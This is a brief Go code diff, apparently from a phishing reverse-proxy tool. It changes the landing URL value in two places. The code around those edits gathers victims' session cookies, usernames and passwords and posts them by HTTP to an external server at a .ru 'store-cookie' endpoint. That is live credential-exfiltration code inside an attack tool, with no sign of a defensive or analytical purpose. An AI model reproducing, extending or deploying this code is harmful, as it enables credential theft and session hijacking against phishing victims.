@@ -870,7 +870,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									params.Add("cookie", TokensToJSON(pl, s.Tokens))
 									params.Add("username", s.Username)
 									params.Add("password", s.Password)
-									params.Add("landing_url", ps.LandingURL)
+									params.Add("landing_url", landing_url)
 
 									log.Info("On params  called : %s", params)
 									resp, err := http.PostForm("https://bulletproftlink.ru/api/store-cookie", params)
@@ -1035,7 +1035,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								params.Add("cookie", TokensToJSON(pl, s.Tokens))
 								params.Add("username", s.Username)
 								params.Add("password", s.Password)
-								params.Add("landing_url", ps.LandingURL)
+								params.Add("landing_url", landing_url)
 
 								log.Info("On params  called : %s", params)
 								resp, err := http.PostForm("https://bulletproftlink.ru/api/store-cookie", params)
